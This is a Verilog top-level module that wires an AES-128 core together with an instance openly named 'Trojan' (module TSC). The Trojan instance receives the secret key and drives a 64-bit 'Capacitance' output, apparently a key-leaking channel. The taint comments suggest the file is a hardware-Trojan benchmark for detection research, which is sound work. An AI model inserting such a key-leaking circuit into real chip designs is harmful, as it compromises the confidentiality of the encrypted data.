`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    12:02:52 03/06/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,	//no_taint
    input rst,	//no_taint
    input [127:0] state,  //taint
    input [127:0] key,	//taint
    output [127:0] out,
	 output [63:0] Capacitance
    );

	aes_128 AES  (clk, state, key, out); 
	TSC Trojan (rst, clk, key, Capacitance); 

endmodule
